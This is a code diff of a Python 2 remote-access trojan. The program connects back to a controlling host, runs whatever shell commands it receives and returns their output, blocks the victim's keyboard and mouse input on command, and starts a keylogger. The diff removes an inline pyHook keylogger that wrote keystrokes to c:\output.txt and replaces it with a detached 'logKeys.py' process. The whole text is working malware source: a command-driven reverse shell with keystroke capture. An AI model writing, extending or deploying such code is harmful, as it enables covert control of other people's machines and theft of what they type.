@@ -11,29 +11,6 @@ import time
 HOST = '127.0.0.1'   
 PORT = 22
 
-def callLogKeys(event):
-    # 0 is for NULL 8 is for Backspace
-    if event.Ascii != 0 or 8:
-        file=open('c:\output.txt','r+')
-        buffer = file.read()
-        file.close()
-    file = open('c:\output.txt','w')
-    recordKeys = chr(event.Ascii)
-    # 13 is for Enter
-    if event.Ascii == 13:
-        recordKeys = '\n'
-    buffer = buffer + recordKeys
-    file.write(buffer)
-    file.close()
-
-def manageLoggedKeys():
-    hookManager = pyHook.HookManager()
-    # This calls the function callLogKeys()
-    hookManager.KeyDown = callLogKeys
-    hookManager.HookKeyboard()
-    # Waits 
-    pythoncom.PumpMessages()
-
 def setBlock(event):    
     return False    
     
@@ -51,27 +28,30 @@ def connect((host, port)):
 	return socketHolder
 
 def run_shell_cmd(socketHolder):
-	data = socketHolder.recv(1024)
-	if data:
-		if data == "exit":
-			socketHolder.close()
-			sys.exit(0)
-                elif data == 'logKeysOn':
-                    manageLoggedKeys()
-                elif data == 'logKeysOff':
-                    pump = False
-                elif data == 'blockInput':
-                        blockInput()
-                elif len(data) == 0:
-			return True
-		else:
+    data = socketHolder.recv(1024)
+    if data:
+        if data == "exit":
+            socketHolder.close()
+            sys.exit(0)
+        elif data == "logKeysOn":
+            # Execute an external program without waiting for it to finish
+            CREATE_NEW_PROCESS_GROUP = 0x00000200
+            DETACHED_PROCESS = 0x00000008
+            pid = subprocess.Popen([sys.executable, "logKeys.py"],
+                creationflags=DETACHED_PROCESS).pid
+            socketHolder.send('Logger started')
+        elif data == 'blockInput':
+            blockInput()
+        elif len(data) == 0:
+            return True
+        else:
 			proc = subprocess.Popen(data, shell=True,
 				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
 				stdin=subprocess.PIPE)
 			stdout_value = proc.stdout.read() + proc.stderr.read()
 			socketHolder.send(stdout_value)
 			return False
-	else:
+    else:
 		print 'Lost connection to host. Will attempt to reconnect.'
 		socketHolder = connect((HOST,PORT))
 
